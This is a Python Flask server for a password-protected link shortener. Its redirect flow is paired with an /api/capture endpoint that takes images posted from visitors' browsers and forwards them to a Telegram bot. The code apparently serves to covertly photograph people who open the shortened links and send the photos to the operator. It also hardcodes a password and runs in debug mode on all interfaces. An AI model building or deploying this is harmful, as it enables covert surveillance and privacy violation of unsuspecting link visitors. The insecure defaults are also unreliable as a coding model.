from flask import Flask, render_template, request, jsonify, redirect, session, url_for, flash
from utils.database import Database
from utils.security import Security
from utils.telegram_bot import TelegramBot
import secrets
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
app.config['PERMANENT_SESSION_LIFETIME'] = 3600  # 1 hour

# Initialize components
db = Database()
security = Security()
telegram_bot = TelegramBot()

PASSWORD = "@35678"

@app.route('/')
def home():
    """Main warning page"""
    return render_template('warning.html')

@app.route('/verify', methods=['POST'])
def verify_password():
    """Verify password and grant access"""
    password = request.form.get('password')
    if password == PASSWORD:
        session['authenticated'] = True
        session['auth_time'] = datetime.now().isoformat()
        return jsonify({'success': True, 'redirect': '/shortener'})
    return jsonify({'success': False, 'message': 'Incorrect password'})

@app.route('/shortener')
def shortener():
    """Link shortener main page"""
    if not session.get('authenticated'):
        return redirect('/')
    return render_template('shortener.html')

@app.route('/api/shorten', methods=['POST'])
def shorten_url():
    """Create short URL"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    original_url = request.json.get('url')
    if not original_url:
        return jsonify({'error': 'URL is required'}), 400
    
    # Generate short code
    short_code = security.generate_short_code()
    
    # Save to database
    link_data = {
        'short_code': short_code,
        'original_url': original_url,
        'created_at': datetime.now(),
        'click_count': 0,
        'created_by': session.get('session_id', 'anonymous')
    }
    
    db.save_link(link_data)
    
    short_url = f"{request.host_url}{short_code}"
    return jsonify({
        'success': True,
        'short_url': short_url,
        'short_code': short_code
    })

@app.route('/api/links')
def get_links():
    """Get recent shortened links"""
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    links = db.get_recent_links(limit=20)
    return jsonify({'links': links})

@app.route('/<short_code>')
def redirect_link(short_code):
    """Redirect to original URL after verification"""
    link_data = db.get_link(short_code)
    if not link_data:
        return "Link not found", 404
    
    # Store short code in session for later redirect
    session['pending_redirect'] = short_code
    session['redirect_count'] = 0
    
    return render_template('redirect.html', short_code=short_code)

@app.route('/api/verify-redirect', methods=['POST'])
def verify_redirect():
    """Verify password for redirect"""
    password = request.json.get('password')
    short_code = session.get('pending_redirect')
    
    if not short_code:
        return jsonify({'error': 'No redirect pending'}), 400
    
    if password == PASSWORD:
        link_data = db.get_link(short_code)
        if link_data:
            # Increment click count
            db.increment_click(short_code)
            return jsonify({
                'success': True,
                'redirect_url': link_data['original_url']
            })
    
    return jsonify({'success': False, 'message': 'Incorrect password'})

@app.route('/api/capture', methods=['POST'])
def capture_image():
    """Receive and forward image to Telegram"""
    try:
        image_data = request.json.get('image')
        if image_data:
            telegram_bot.send_photo(image_data)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check-auth')
def check_auth():
    """Check if user is authenticated"""
    return jsonify({'authenticated': session.get('authenticated', False)})

@app.route('/logout')
def logout():
    """Clear session"""
    session.clear()
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
